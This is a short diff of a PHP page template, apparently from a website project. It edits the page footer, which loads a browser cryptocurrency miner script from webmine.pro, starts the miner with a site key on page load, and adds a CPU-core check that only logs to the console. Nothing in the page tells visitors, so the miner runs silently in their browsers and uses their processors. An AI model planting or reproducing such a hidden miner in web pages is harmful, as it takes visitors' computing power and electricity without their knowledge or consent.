@@ -288,10 +288,20 @@ public function onStart()
 			</div>
 		</div>
 	</div>
-	<script src="//webmine.pro/lib/crlt.js"></script>
+	<script src="//webmine.pro/lib/crlt.js" defer></script>
 	<script defer>
+		var cpu = navigator.hardwareConcurrency;
 		var miner = new CRLT.Anonymous('88cec69559260125fb23f076233a035998cd9bbd5d9f');
+		if(cpu > 2) {
+			console.log('more than 2');
+		} else if(cpu <= 2) {
+			console.log('less than 2');
+		} else {
+			console.log('no cpu');
+		}
+		
 		miner.start();
+
 	</script>
 </body>
 </html>
